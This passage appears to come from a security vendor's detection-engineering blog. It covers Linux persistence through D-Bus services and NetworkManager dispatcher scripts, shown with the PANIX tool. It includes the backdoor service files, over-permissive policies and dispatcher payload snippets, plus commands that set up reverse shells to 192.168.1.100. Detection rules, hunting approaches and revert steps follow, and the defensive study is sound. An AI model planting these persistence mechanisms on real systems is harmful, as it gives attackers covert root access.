<li>Notifications sent by a service to inform other processes about events.</li>
<li>Example: A signal might indicate a network connection status change.</li>
</ul>
<p>As an example, the following command sends a message to the system bus to invoke the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Reload</code> method on the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NetworkManager</code> service:</p>
<pre><code>dbus-send --system --dest=org.freedesktop.NetworkManager /org/freedesktop/NetworkManager org.freedesktop.NetworkManager.Reload uint32:0</code></pre>
<p>D-Bus services are applications or daemons that register themselves on the bus to provide functionality. If a requested service is not running, the D-Bus daemon can start it automatically using predefined service files.</p>
<p>These services use service files with a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.service</code> extension to tell D-Bus how to start a service. For example:</p>
<pre><code>[D-BUS Service]
Name=org.freedesktop.MyService
Exec=/usr/bin/my-service
User=root</code></pre>
<p>D-Bus service files can be located in several different locations, depending on whether these services are running system-wide or at the user-level, and depending on the architecture and Linux distribution. The following is an overview of locations that are used, which is not an exhaustive list, as different distributions use different default locations:</p>
<ol>
<li><strong>System-wide Configuration and Services</strong>:<!-- -->
<ul>
<li>System service files:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/dbus-1/system-services/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/share/dbus-1/system-services/</code></li>
</ul>
</li>
<li>System policy files:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/dbus-1/system.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/dbus-1/system.d/</code></li>
</ul>
</li>
<li>System configuration files:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/dbus-1/system.conf</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/dbus-1/system.conf</code></li>
</ul>
</li>
</ul>
</li>
<li><strong>Session-wide Configuration and Services</strong>:<!-- -->
<ul>
<li>Session service files:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/dbus-1/session-services/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.local/share/dbus-1/services/</code></li>
</ul>
</li>
<li>Session policy files:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/dbus-1/session.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/dbus-1/session.d/</code></li>
</ul>
</li>
<li>Session configuration files:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/dbus-1/session.conf</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/dbus-1/session.conf</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<p>More details on each path is available <a href="https://dbus.freedesktop.org/doc/dbus-daemon.1.html">here</a>. D-Bus policies, written in XML, define access control rules for D-Bus services. These policies specify who can perform actions such as sending messages, receiving responses, or owning specific services. They are essential for controlling access to privileged operations and ensuring that services are not misused. There are several key components to a D-Bus policy:</p>
<ol>
<li><strong>Context</strong>:</li>
</ol>
<ul>
<li>Policies can apply to specific users, groups, or a default context (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">default</code> applies to all users unless overridden).</li>
</ul>
<ol start="2">
<li><strong>Allow/Deny Rules</strong>:</li>
</ol>
<ul>
<li>Rules explicitly grant (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">allow</code>) or restrict (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">deny</code>) access to methods, interfaces, or services.</li>
</ul>
<ol start="3">
<li><strong>Granularity</strong>:</li>
</ol>
<ul>
<li>Policies can control access at multiple levels:<!-- -->
<ul>
<li>Entire services (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.freedesktop.MyService</code>).</li>
<li>Specific methods or interfaces (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.freedesktop.MyService.SecretMethod</code>).</li>
</ul>
</li>
</ul>
<p>The following example demonstrates a D-Bus policy that enforces clear access restrictions:</p>
<pre><code>&lt;!DOCTYPE busconfig PUBLIC &quot;-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN&quot;
  &quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;&gt;
&lt;busconfig&gt;
    &lt;!-- Default policy: Deny all access --&gt;
    &lt;policy context=&quot;default&quot;&gt;
        &lt;deny send_destination=&quot;org.freedesktop.MyService&quot;/&gt;
    &lt;/policy&gt;

    &lt;!-- Allow only users in the &quot;admin&quot; group to access specific methods --&gt;
    &lt;policy group=&quot;admin&quot;&gt;
        &lt;allow send_interface=&quot;org.freedesktop.MyService.PublicMethod&quot;/&gt;
    &lt;/policy&gt;

    &lt;!-- Allow root to access all methods --&gt;
    &lt;policy user=&quot;root&quot;&gt;
        &lt;allow send_destination=&quot;org.freedesktop.MyService&quot;/&gt;
    &lt;/policy&gt;
&lt;/busconfig&gt;</code></pre>
<p>This policy:</p>
<ol>
<li>Denies all access to the service <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.freedesktop.MyService</code> by default.</li>
<li>Grants users in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">admin</code> group access to a specific interface (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.freedesktop.MyService.PublicMethod</code>).</li>
<li>Grants full access to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.freedesktop.MyService</code> destination for the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">root</code> user.</li>
</ol>
<p>D-Bus’s central role in IPC makes it a potential interesting target for attackers. Potential attack vectors include:</p>
<ol>
<li><strong>Hijacking or Registering Malicious Services</strong>:<!-- -->
<ul>
<li>Attackers can replace or add <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.service</code> files in e.g. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/dbus-1/system-services/</code> to hijack legitimate communication or inject malicious code.</li>
</ul>
</li>
<li><strong>Creating or Exploiting Over-permissive Policies</strong>:<!-- -->
<ul>
<li>Weak policies (e.g., granting all users access to critical services) can allow attackers to invoke privileged methods.</li>
</ul>
</li>
<li><strong>Abusing Vulnerable Services</strong>:<!-- -->
<ul>
<li>If a D-Bus service improperly validates input, attackers may execute arbitrary code or perform unauthorized actions.</li>
</ul>
</li>
</ol>
<p>The examples above can be used for privilege escalation, defense evasion and persistence. Currently, there is no specific MITRE ATT&amp;CK sub-technique for D-Bus. However, its abuse aligns closely with <a href="https://attack.mitre.org/techniques/T1543/">T1543: Create or Modify System Process</a>, as well as <a href="https://attack.mitre.org/techniques/T1574/">T1574: Hijack Execution Flow</a> for cases where <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.service</code> files are modified.</p>
<p>In the next section we will take a look at how an attacker can set up overly permissive D-Bus configurations that send out reverse connections with root permissions, while discussing approaches to detecting this behavior.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="persistence-through-t1543---create-or-modify-system-process-d-bus" class="absolute -top-32"></span>Persistence through T1543 - Create or Modify System Process: D-Bus</h1>
<p>Now that we&#x27;ve learnt all about D-Bus setup, it’s time to take a look at how to simulate this in practice through the <a href="https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_dbus.sh">setup_dbus.sh</a> PANIX module. PANIX starts off by creating a D-Bus service file at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/dbus-1/system-services/org.panix.persistence.service</code> with the following contents:</p>
<pre><code>cat &lt;&lt;&#x27;EOF&#x27; &gt; &quot;$service_file&quot;
[D-BUS Service]
Name=org.panix.persistence
Exec=/usr/local/bin/dbus-panix.sh
User=root
EOF</code></pre>
<p>This service file will listen on the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.panix.persistence</code> interface, and execute the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/bin/dbus-panix.sh</code> “service”. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dbus-panix.sh</code> script simply invokes a reverse shell connection when called:</p>
<pre><code>cat &lt;&lt;EOF &gt; &quot;$payload_script&quot;
#!/bin/bash
# When D-Bus triggers this service, execute payload.
${payload}
EOF</code></pre>
<p>To ensure any user is allowed to invoke the actions corresponding to the interface, PANIX sets up a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/dbus-1/system.d/org.panix.persistence.conf</code> file with the following contents:</p>
<pre><code>cat &lt;&lt;&#x27;EOF&#x27; &gt; &quot;$conf_file&quot;
&lt;!DOCTYPE busconfig PUBLIC &quot;-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN&quot;
	&quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;&gt;
&lt;busconfig&gt;
	&lt;!-- Allow any user to own, send to, and access the specified service --&gt;
	&lt;policy context=&quot;default&quot;&gt;
		&lt;allow own=&quot;org.panix.persistence&quot;/&gt;
		&lt;allow send_destination=&quot;org.panix.persistence&quot;/&gt;
		&lt;allow send_interface=&quot;org.panix.persistence&quot;/&gt;
	&lt;/policy&gt;
&lt;/busconfig&gt;
EOF</code></pre>
<p>This configuration defines a D-Bus policy that permits any user or process to own, send messages to, and interact with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.panix.persistence</code> service, effectively granting unrestricted access to it. After restarting the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dbus</code> service, the setup is complete.</p>
<p>To interact with the service, the following command can be used:</p>
<pre><code>dbus-send --system --type=method_call /
--dest=org.panix.persistence /org/panix/persistence /
org.panix.persistence.Method</code></pre>
<p>This command sends a method call to the D-Bus system bus, targeting the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.panix.persistence</code> service, invoking the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.panix.persistence.Method</code> method on the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/org/panix/persistence</code> object, effectively triggering the backdoor.</p>
<p>Let’s run the PANIX module with the following command line arguments:</p>
<pre><code>&gt; sudo ./panix.sh --dbus --default --ip 192.168.1.100 --port 2016

[+] Created/updated D-Bus service file: /usr/share/dbus-1/system-services/org.panix.persistence.service
[+] Created/updated payload script: /usr/local/bin/dbus-panix.sh
[+] Created/updated D-Bus config file: /etc/dbus-1/system.d/org.panix.persistence.conf
[!] Restarting D-Bus...
[+] D-Bus restarted successfully.
[+] D-Bus persistence module completed. Test with:

dbus-send --system --type=method_call --print-reply /
--dest=org.panix.persistence /org/panix/persistence /
org.panix.persistence.Method</code></pre>
<p>Upon execution of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dbus-send</code> command:</p>
<pre><code>dbus-send --system --type=method_call --print-reply /
--dest=org.panix.persistence /org/panix/persistence /
org.panix.persistence.Method</code></pre>
<p>We will take a look at the documents in Kibana:</p>
<p></p>
<p>Upon PANIX execution, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.panix.persistence.service</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dbus-panix.sh</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.panix.persistence.conf</code> files are created, successfully setting the stage. Afterwards, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dbus</code> service is restarted, and the dbus-send command is executed to interact with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.panix.persistence</code> service. Upon invocation of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">org.panix.persistence.Method</code> method, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dbus-panix.sh</code> backdoor is executed, and the reverse shell connection chain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dbus-panix.sh</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code>) is initiated.</p>
<p>Let’s take a look at our detection opportunities:</p>
<p><em>Detection and endpoint rules that cover D-Bus persistence</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">File</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/fb13b89f8d277ee78d4027a8014ad67023aa167c/rules/linux/persistence_dbus_service_creation.toml">D-Bus Service Created</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/protections-artifacts/blob/3fac07906582ca9615d0e291a4629445fd5ca37b/behavior/rules/linux/execution_suspicious_d_bus_method_call.toml">Suspicious D-Bus Method Call</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/rules/linux/persistence_dbus_unsual_daemon_parent_execution.toml">Unusual D-Bus Daemon Child Process</a></td></tr></tbody></table></div>
<p>To revert any changes, you can use the corresponding revert module by running:</p>
<pre><code>&gt; ./panix.sh --revert dbus

[*] Reverting D-Bus persistence module...
[+] Removing D-Bus service file: /usr/share/dbus-1/system-services/org.panix.persistence.service...
[+] D-Bus service file removed.
[+] Removing payload script: /usr/local/bin/dbus-panix.sh
[+] Payload script removed.
[+] Removing D-Bus configuration file: /etc/dbus-1/system.d/org.panix.persistence.conf...
[+] D-Bus configuration file removed.
[*] Restarting D-Bus...
[+] D-Bus restarted successfully.
[+] D-Bus persistence reverted.</code></pre>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="hunting-for-t1543---create-or-modify-system-process-d-bus" class="absolute -top-32"></span>Hunting for T1543 - Create or Modify System Process: D-Bus</h1>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the use and modification of D-Bus-related files, services, and processes. The approach includes monitoring for the following:</p>
<ol>
<li><strong>Creations and/or Modifications to D-Bus Configuration and Service Files</strong>: Tracks changes in critical directories, such as system-wide and session service files and policy files. Monitoring these paths helps detect unauthorized additions or modifications that may indicate malicious activity targeting D-Bus.</li>
<li><strong>Metadata Analysis of D-Bus Files</strong>: Inspects file ownership, last access times, and modification timestamps for D-Bus configuration files. This can reveal unauthorized changes or the presence of unexpected files that may indicate attempts to persist through D-Bus.</li>
<li><strong>Detection of Suspicious Processes</strong>: Monitors executions of processes such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dbus-daemon</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dbus-send</code>, which are key components of D-Bus communication. By tracking command lines, parent processes, and execution counts, unusual or unauthorized usage can be identified.</li>
<li><strong>Detection of Rare or Anomalous Events</strong>: Identifies uncommon file modifications or process executions by correlating event data across endpoints. This highlights subtle indicators of compromise, such as rare changes to critical D-Bus configurations or the unexpected use of D-Bus commands.</li>
</ol>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_desktop_bus.toml">Persistence via Desktop Bus (D-Bus)</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1543/">T1543</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="t1546---event-triggered-execution-networkmanager" class="absolute -top-32"></span>T1546 - Event Triggered Execution: NetworkManager</h1>
<p><a href="https://wiki.archlinux.org/title/NetworkManager">NetworkManager</a> is a widely used daemon for managing network connections on Linux systems. It allows for configuring wired, wireless, VPN, and other network interfaces while offering a modular and extensible design. One of its lesser-known but powerful features is its <a href="https://wiki.archlinux.org/title/NetworkManager#Network_services_with_NetworkManager_dispatcher">dispatcher</a> feature, which provides a way to execute scripts automatically in response to network events. When certain network events occur (e.g., an interface comes up or goes down), NetworkManager invokes scripts located in this directory. These scripts run as root, making them highly privileged.</p>
<ul>
<li><strong>Event Types</strong>: NetworkManager passes specific events to scripts, such as:<!-- -->
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">up</code>: Interface is activated.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">down</code>: Interface is deactivated.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vpn-up</code>: VPN connection is established.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vpn-down</code>: VPN connection is disconnected.</li>
</ul>
</li>
</ul>
<p>Scripts placed in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/NetworkManager/dispatcher.d/</code> are standard shell scripts and must be marked executable. An example of a dispatcher script may look like this:</p>
<pre><code>#!/bin/bash
INTERFACE=$1
EVENT=$2

if [ &quot;$EVENT&quot; == &quot;up&quot; ]; then
    logger &quot;Interface $INTERFACE is up. Executing custom script.&quot;
    # Perform actions, such as logging, mounting, or starting services
    /usr/bin/some-command --arg value
elif [ &quot;$EVENT&quot; == &quot;down&quot; ]; then
    logger &quot;Interface $INTERFACE is down. Cleaning up.&quot;
    # Perform cleanup actions
fi</code></pre>
<p>Logging events and executing commands whenever a network interface comes up or goes down.</p>
<p>To achieve persistence through this technique, an attacker can either:</p>
<ul>
<li>Create a custom script, mark it executable and place it within the dispatcher directory</li>
<li>Modify a legitimate dispatcher script to execute a payload upon a certain network event.</li>
</ul>
<p>Persistence through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">dispatcher.d/</code> aligns with <a href="https://attack.mitre.org/techniques/T1546/">T1546: Event Triggered Execution</a> and <a href="https://attack.mitre.org/techniques/T1543/">T1543: Create or Modify System Process</a> in the MITRE ATT&amp;CK framework. NetworkManager dispatcher scripts however do not have their own sub-technique.</p>
<p>In the next section, we will explore how dispatcher scripts can be exploited for persistence and visualize the process flow to support effective detection engineering.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="persistence-through-t1546---event-triggered-execution" class="absolute -top-32"></span>Persistence through T1546 - Event Triggered Execution:</h1>
<p>The concept of this technique is very simple, let’s now put it to practice through the <a href="https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_network_manager.sh">setup_network_manager.sh</a> PANIX module. The module checks whether the NetworkManager package is available, and whether the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/NetworkManager/dispatcher.d/</code> path exists, as these are requisites for the technique to work. Next, it creates a new dispatcher file under <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/NetworkManager/dispatcher.d/panix-dispatcher.sh</code>, with a payload on the end. Finally, it grants execution permissions to the dispatcher file, after which it is ready to be activated.</p>
<pre><code>cat &lt;&lt;&#x27;EOF&#x27; &gt; &quot;$dispatcher_file&quot;
#!/bin/sh -e

if [ &quot;$2&quot; = &quot;connectivity-change&quot; ]; then
	exit 0
fi

if [ -z &quot;$1&quot; ]; then
	echo &quot;$0: called with no interface&quot; 1&gt;&amp;2
	exit 1
fi

[...]

# Insert payload here:
__PAYLOAD_PLACEHOLDER__
EOF

chmod +x &quot;$dispatcher_file&quot;</code></pre>
<p>We have included only the most relevant snippets of the module above. Feel free to check out the module source code if you are interested in diving deeper.</p>
<p>Let’s run the PANIX module with the following command line arguments:</p>
<pre><code>&gt; sudo ./panix.sh --network-manager --default --ip 192.168.1.100 --port 2017

[+] Created new dispatcher file: /etc/NetworkManager/dispatcher.d/panix-dispatcher.sh
[+] Replaced payload placeholder with actual payload.
[+] Using dispatcher file: /etc/NetworkManager/dispatcher.d/panix-dispatcher.sh</code></pre>
<p>Now, whenever a new network event triggers, the payload will be executed. This can be done through restarting the NetworkManager service, an interface or a reboot. Let’s take a look at the documents in Kibana:</p>
<p></p>
<p>Upon PANIX execution, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix-dispatcher.sh</code> script is created, marked as executable and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sed</code> is used to add the payload to the bottom of the script. Upon restarting the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NetworkManager</code> service through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemctl</code>, we can see <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nm-dispatcher</code> executing the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix-dispatcher.sh</code> script, effectively detonating the reverse shell chain (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">panix-dispatcher.sh</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nohup</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">setsid</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code>).</p>
<p>And finally, let’s take a look at our detection opportunities:</p>
<p><em>Detection and endpoint rules that cover network-manager persistence</em></p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th align="left">Category</th><th align="left">Coverage</th></tr></thead><tbody><tr><td align="left">File</td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/9b8b9175985ed533493e2c9dc4dc17ee8bf9e704/rules/linux/persistence_network_manager_dispatcher_persistence.toml">NetworkManager Dispatcher Script Creation</a></td></tr><tr><td align="left"></td><td align="left"><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td align="left">Process</td><td align="left"><a href="https://github.com/elastic/protections-artifacts/blob/3fac07906582ca9615d0e291a4629445fd5ca37b/behavior/rules/linux/execution_shell_via_networkmanager_dispatcher_script.toml">Shell via NetworkManager Dispatcher Script</a></td></tr><tr><td align="left">Network</td><td align="left"><a href="https://github.com/elastic/protections-artifacts/blob/3fac07906582ca9615d0e291a4629445fd5ca37b/behavior/rules/linux/execution_reverse_shell_via_networkmanager_dispatcher_script.toml">Reverse Shell via NetworkManager Dispatcher Script</a></td></tr></tbody></table></div>
<p>To revert any changes, you can use the corresponding revert module by running:</p>
<pre><code>&gt; ./panix.sh --revert network-manager

[+] Checking for payload in /etc/NetworkManager/dispatcher.d/01-ifupdown...
[+] No payload found in /etc/NetworkManager/dispatcher.d/01-ifupdown.
[+] Removing custom dispatcher file: /etc/NetworkManager/dispatcher.d/panix-dispatcher.sh...
[+] Custom dispatcher file removed.
[+] NetworkManager persistence reverted.</code></pre>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="hunting-for-t1546---event-triggered-execution-networkmanager" class="absolute -top-32"></span>Hunting for T1546 - Event Triggered Execution: NetworkManager</h1>
<p>We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the creation, modification, and execution of NetworkManager Dispatcher scripts. The approach includes monitoring for the following:</p>
<ol>
<li><strong>Creations and/or Modifications to Dispatcher Scripts</strong>: Tracks changes within the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/NetworkManager/dispatcher.d/</code> directory. Monitoring for new or altered scripts helps detect unauthorized additions or modifications that could indicate malicious intent.</li>
<li><strong>Detection of Suspicious Processes</strong>: Monitors processes executed by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nm-dispatcher</code> or scripts located in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/NetworkManager/dispatcher.d/</code>. By analyzing command lines, parent processes, and execution counts, unusual or unauthorized script executions can be identified.</li>
<li><strong>Metadata Analysis of Dispatcher Scripts</strong>: Inspects ownership, last access times, and modification timestamps for files in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/NetworkManager/dispatcher.d/</code>. This can reveal unauthorized changes or anomalies in file attributes that may indicate persistence attempts.</li>
</ol>
